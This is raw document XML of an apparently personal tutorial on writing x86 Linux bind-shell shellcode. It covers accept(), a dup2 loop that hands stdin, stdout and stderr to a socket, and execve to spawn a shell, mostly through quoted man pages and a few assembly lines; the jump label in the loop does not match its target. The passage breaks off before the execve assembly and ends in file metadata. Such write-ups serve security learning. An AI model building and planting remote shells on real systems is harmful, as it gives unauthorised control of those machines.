      <text:p text:style-name="P61">less /usr/include/linux/net.h</text:p>
      <text:p text:style-name="P61">#define SYS_SOCKET <text:s text:c="5"/>1 <text:s text:c="14"/>/* sys_socket(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P61">#define SYS_BIND <text:s text:c="7"/>2 <text:s text:c="14"/>/* sys_bind(2) <text:s text:c="17"/>*/</text:p>
      <text:p text:style-name="P61">#define SYS_CONNECT <text:s text:c="4"/>3 <text:s text:c="14"/>/* sys_connect(2) <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P61">#define SYS_LISTEN <text:s text:c="5"/>4 <text:s text:c="14"/>/* sys_listen(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P61">#define SYS_ACCEPT <text:s text:c="5"/>5 <text:s text:c="14"/>/* sys_accept(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P61"/>
      <text:p text:style-name="P64">SYNOPSIS</text:p>
      <text:p text:style-name="P64"><text:s text:c="7"/>#include &lt;sys/types.h&gt; <text:s text:c="9"/>/* See NOTES */</text:p>
      <text:p text:style-name="P64"><text:s text:c="7"/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64"><text:s text:c="7"/>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64"><text:s text:c="7"/>#define _GNU_SOURCE <text:s text:c="12"/>/* See feature_test_macros(7) */</text:p>
      <text:p text:style-name="P64"><text:s text:c="7"/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64"><text:s text:c="7"/>int accept4(int sockfd, struct sockaddr *addr,</text:p>
      <text:p text:style-name="P64"><text:s text:c="19"/>socklen_t *addrlen, int flags);</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64">DESCRIPTION</text:p>
      <text:p text:style-name="P64"><text:s text:c="7"/>The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). <text:s/>It extracts the first connection</text:p>
      <text:p text:style-name="P64"><text:s text:c="7"/>request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor <text:s/>referring <text:s/>to that socket. <text:s/>The newly created socket is not in the listening state. <text:s/>The original socket sockfd is unaffected by this call.</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64"><text:s text:c="7"/>The argument sockfd is a socket that has been created with socket(2), bound to a local address with bind(2), and <text:s/>is <text:s/>listening <text:s/>for connections after a listen(2).</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64"><text:soft-page-break/><text:s text:c="7"/>The <text:s/>argument <text:s/>addr is a pointer to a sockaddr structure. <text:s/>This structure is filled in with the address of the peer socket, as known to the communications layer. <text:s/>The exact format of the address returned addr is <text:s/>determined <text:s/>by <text:s/>the <text:s/>socket's <text:s/>address <text:s/>family <text:s/>(see socket(2) <text:s/>and <text:s/>the respective protocol man pages). <text:s/>When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P64">So, we need the followings:</text:p>
      <text:p text:style-name="P64">accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</text:p>
      <text:p text:style-name="P64">sockfd=esi</text:p>
      <text:p text:style-name="P64">struct: 0 as we don't care what the client has</text:p>
      <text:p text:style-name="P64">addrlen:0 as we don't care about the client.</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65">Assembly:</text:p>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P65"/>
      <text:p text:style-name="P66">#5:</text:p>
      <text:p text:style-name="P66">Redirect STDIN (0), STDOUT(1), STDERR(2)</text:p>
      <text:p text:style-name="P66"/>
      <text:p text:style-name="P69">We will use DUP2. </text:p>
      <text:p text:style-name="P70">SYNOPSIS</text:p>
      <text:p text:style-name="P70"><text:s text:c="7"/>#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>int dup(int oldfd);</text:p>
      <text:p text:style-name="P70"><text:s text:c="7"/>int dup2(int oldfd, int newfd);</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>#define _GNU_SOURCE <text:s text:c="12"/>/* See feature_test_macros(7) */</text:p>
      <text:p text:style-name="P70"><text:s text:c="7"/>#include &lt;fcntl.h&gt; <text:s text:c="13"/>/* Obtain O_* constant definitions */</text:p>
      <text:p text:style-name="P70"><text:s text:c="7"/>#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>int dup3(int oldfd, int newfd, int flags);</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70">DESCRIPTION</text:p>
      <text:p text:style-name="P70"><text:s text:c="7"/>These system calls create a copy of the file descriptor oldfd.</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>dup() uses the lowest-numbered unused descriptor for the new descriptor.</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>dup2() makes newfd be the copy of oldfd, closing newfd first if necessary, but note the following:</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"><text:s text:c="7"/>* <text:s/>If oldfd is not a valid file descriptor, then the call fails, and newfd is not closed.</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70">* <text:s/>If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2() does nothing, and returns newfd.</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P72"><text:s text:c="7"/>After <text:s/>a successful return from one of these system calls, the old and new file descriptors may be used interchangeably. <text:s/>They refer to the same open file description (see open(2)) and thus share file offset and file status flags; for example, if the file offset is modified by using lseek(2) on one of the descriptors, the offset is also changed for the other.</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P72"><text:s text:c="7"/>The <text:s/>two descriptors do not share file descriptor flags (the close-on-exec flag). <text:s/>The close-on-exec <text:soft-page-break/>flag (FD_CLOEXEC; see fcntl(2)) for the duplicate descriptor is off.</text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P77">Ok, get the syscall for DUP2:</text:p>
      <text:p text:style-name="P77">less /usr/include/i386-linux-gnu/asm/unistd_32.h</text:p>
      <text:p text:style-name="P77">it is 63<text:span text:style-name="T23">=0x3F</text:span></text:p>
      <text:p text:style-name="P71"/>
      <text:p text:style-name="P73">We need to do: </text:p>
      <text:p text:style-name="P73">dup2(<text:span text:style-name="T21">oldfd</text:span>,<text:span text:style-name="T21">newfd</text:span>)</text:p>
      <text:p text:style-name="P74">oldfd will be the EBX socketfd, <text:span text:style-name="T22">new will be 0 (stdin),1(stdout),2(stderr).</text:span></text:p>
      <text:p text:style-name="P75">I put this in a loop <text:span text:style-name="T25">()</text:span>.</text:p>
      <text:p text:style-name="P78">cl will be the counter. It has to be zeroed out and set to 2. If we look at the stack, we see<text:span text:style-name="T20">:</text:span></text:p>
      <text:p text:style-name="P67">Ubuntu-2015-02-05-11-03-21.png</text:p>
      <text:p text:style-name="P68">We have 0x00000007 as the socket file descriptor, and 0x00000000.</text:p>
      <text:p text:style-name="P78">We can pop this 0 to ecx and we hit two birds with one stone.</text:p>
      <text:p text:style-name="P80">pop ecx</text:p>
      <text:p text:style-name="P80"/>
      <text:p text:style-name="P78">Set the cl to 2:</text:p>
      <text:p text:style-name="P78">mov cl,0x2 ; initiate counter</text:p>
      <text:p text:style-name="P78">call result will be returned to EAX, which is currently busy with storing the socketfd. <text:span text:style-name="T26">Let's store socketfd in EBX for now using XCHG. EBX used to store 0x5 for the Accept call, we don't need that any more.</text:span></text:p>
      <text:p text:style-name="P79">xchg ebx, eax</text:p>
      <text:p text:style-name="P76"/>
      <text:p text:style-name="P79">define the dup2 with the aruments in the loop <text:span text:style-name="T27">(EBX won't change, it is socketfd)</text:span>:</text:p>
      <text:p text:style-name="P76"><text:span text:style-name="T25">m</text:span>yloop:</text:p>
      <text:p text:style-name="P76"><text:s/>mov al,0x3<text:span text:style-name="T24">F</text:span> ;dup2 syscall</text:p>
      <text:p text:style-name="P76"><text:s/><text:span text:style-name="T24">int 0x80 ;syscall dup2</text:span></text:p>
      <text:p text:style-name="P76"><text:s/><text:span text:style-name="T24">dec ecx ; decrement counter</text:span></text:p>
      <text:p text:style-name="P76"><text:s/><text:span text:style-name="T24">jns loop ; jmp to loop as long as SF is not set to 1</text:span></text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P81">#6 </text:p>
      <text:p text:style-name="P81">execute shell vie execve</text:p>
      <text:p text:style-name="P82">man execve</text:p>
      <text:p text:style-name="P82">SYNOPSIS</text:p>
      <text:p text:style-name="P82"><text:s text:c="7"/>#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="7"/>int execve(const char *filename, char *const argv[],</text:p>
      <text:p text:style-name="P82"><text:s text:c="18"/>char *const envp[]);</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82">DESCRIPTION</text:p>
      <text:p text:style-name="P82"><text:s text:c="7"/>execve() executes the program pointed to by filename. <text:s/>filename must be either a binary executable, or a script starting with a line of the form:</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="11"/>#! interpreter [optional-arg]</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="7"/>For details of the latter case, see "Interpreter scripts" below.</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="7"/>argv is an array of argument strings passed to the new program. <text:s/>By convention, the first of these strings should contain the <text:s/>file name <text:s/>associated <text:s/>with the file being executed. <text:s/>envp is an array of <text:soft-page-break/>strings, conventionally of the form key=value, which are passed as environment to the new program. <text:s/>Both argv and envp must be terminated by a NULL pointer. <text:s/>The argument <text:s/>vector <text:s/>and <text:s/>environment</text:p>
      <text:p text:style-name="P82"><text:s text:c="7"/>can be accessed by the called program's main function, when it is defined as:</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="11"/>int main(int argc, char *argv[], char *envp[])</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P82"><text:s text:c="7"/>execve() <text:s/>does <text:s/>not return on success, and the text, data, bss, and stack of the calling process are overwritten by that of the program loaded.</text:p>
      <text:p text:style-name="P82"/>
      <text:p text:style-name="P84">So we need this:</text:p>
      <text:p text:style-name="P83">execve(*filename, *const argv[],*const envp[]);</text:p>
      <text:p text:style-name="P83"/>
      <text:p text:style-name="P85">syscall for execve is <text:span text:style-name="T28">11=0x0b</text:span>: </text:p>
      <text:p text:style-name="P85"><text:span text:style-name="T28">less /usr/include/i386-linux-gnu/asm/unistd_32.h</text:span></text:p>
      <text:p text:style-name="P85"/>
      <text:p text:style-name="P86">As the system is in little-endian, we need to push the command in reverse order ending with 0x0.</text:p>
      <text:p text:style-name="P86">Assembly:</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09:47:30.585000000</meta:creation-date>
    <dc:date>2015-02-05T11:29:10.158000000</dc:date>
    <meta:editing-duration>PT7H6M21S</meta:editing-duration>
    <meta:editing-cycles>107</meta:editing-cycles>
    <meta:generator>LibreOffice/4.2.6.3$Windows_x86 LibreOffice_project/3fd416d4c6db7d3204c17ce57a1d70f6e531ee21</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="13" meta:paragraph-count="417" meta:word-count="3445" meta:character-count="25247" meta:non-whitespace-character-count="19440"/>
  </office:meta>
</office:document-meta>
</file>